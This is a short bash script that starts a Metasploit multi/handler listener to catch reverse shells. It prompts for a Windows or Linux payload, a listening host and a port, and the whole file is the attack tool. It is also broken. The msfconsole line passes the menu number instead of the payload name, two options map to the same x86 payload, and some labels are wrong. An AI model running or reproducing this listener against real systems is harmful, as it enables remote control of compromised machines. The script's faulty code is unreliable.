#!/bin/bash

echo "Metasploit Listers"
echo "[1] - Staged (Windows x86)"
echo "[2] - Staged (Windows x64)"
echo "[3] - Stageless (Windows x84)"
echo "[4] - Stageless (Windows x64)"
echo "[5] - Staged (Linux x86)"
echo "[6] - Staged (Linux x64)"
echo "[7] - Stageless (Linux x84)"
echo "[8] - Stageless (Linux x64)"
echo
echo -n "Choice: "
read choice

case $choice in
	1) payload="windows/shell/reverse_tcp";;
	2) payload="windows/x64/shell_reverse_tcp";;
	3) payload="windows/shell_reverse_tcp";;
	4) payload="windows/shell_reverse_tcp";;
	5) payload="linux/x86/shell/reverse_tcp";;
	6) payload="linux/x64/shell/reverse_tcp";;
	7) payload="linux/x86/shell_reverse_tcp";;
	8) payload="linux/x64/shell_reverse_tcp";;
	*) echo "Wrong choice"
esac
echo -n "LHOST: "
read lhost

echo -n "LPORT:"
read lport
	

msfconsole -q -x "use exploit/multi/handler; set payload $choice; set lhost $lhost; set lport $lport; exploit;"
